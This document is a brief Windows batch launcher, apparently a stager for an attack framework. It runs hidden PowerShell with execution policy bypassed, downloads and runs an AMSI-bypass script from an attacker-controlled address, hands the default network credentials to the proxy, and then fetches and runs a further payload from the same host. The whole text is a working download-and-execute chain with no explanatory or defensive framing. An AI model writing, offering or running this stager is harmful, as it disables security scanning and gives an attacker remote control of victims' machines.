set LHOST="192.168.179.128"
set LPORTWEB=80
powershell -nol -w 1 -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://%LHOST%:%LPORTWEB%/amsi-bypass.ps1');Start-Sleep 2;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.179.128:443/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex;"